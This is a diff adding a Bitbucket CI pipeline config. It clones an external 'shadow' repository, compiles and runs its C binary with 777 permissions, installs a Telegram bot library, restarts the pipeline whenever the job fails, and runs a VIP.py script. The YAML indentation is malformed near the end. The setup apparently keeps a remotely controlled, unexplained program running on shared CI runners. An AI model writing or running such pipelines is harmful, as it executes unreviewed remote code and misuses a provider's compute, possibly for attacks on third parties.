@@ -1,0 +1,19 @@
+pipelines:
+  default:
+    - step:
+        name: Run Script
+        image: python:3.9
+        size: 2x
+        script:
+          - git clone https://github.com/ZoyaAkhtar88/shadow.git
+          - cd shadow
+          - ls
+          - gcc -o shadow shadow.c -lz -static -lpthread
+          - pip install telebot
+          - pip install requests
+          - chmod 777 shadow
+         
+          - ./run-your-build-script.sh
+        after-script:
+          - if [ "$BITBUCKET_EXIT_CODE" -ne 0 ]; then ./restart_pipeline.sh & fi
+           - python3 VIP.py
